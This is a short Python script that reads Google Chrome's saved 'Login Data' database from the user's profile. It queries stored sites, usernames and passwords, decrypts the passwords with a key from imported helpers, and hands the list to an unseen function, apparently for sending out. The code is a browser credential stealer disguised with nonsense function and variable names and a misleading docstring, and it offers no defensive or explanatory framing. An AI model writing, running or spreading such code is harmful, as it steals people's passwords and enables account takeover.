import os
import sqlite3
import shutil
from mods.alpha import zxy_ab
from mods.beta import iop_lkj
from mods.gamma import bop_waz

def zap_bobble():
    """Muddle through the loopy."""
    buzz_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                             'Google', 'Chrome', 'User Data', 'default', 'Login Data')
    
    if not os.path.exists(buzz_path):
        print("No go at the mojo path.")
        return

    shutil.copyfile(buzz_path, "temp_zyx_iku.zyga")
    
    choo = sqlite3.connect("temp_zyx_iku.zyga")
    fizz_buzz = choo.cursor()
    
    flibber_key = zxy_ab()
    
    
    pepper_salt_sugar_list = []
    
    fizz_buzz.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for fz1, fz2, fz3 in fizz_buzz.fetchall():
        if fz2:
            decrypted_fz = iop_lkj(fz3, flibber_key)
            pepper_salt_sugar_list.append((fz1, fz2, decrypted_fz)) 
    
    
    bop_waz(pepper_salt_sugar_list)
    
    fizz_buzz.close()
    choo.close()
    os.remove("temp_zyx_iku.zyga")
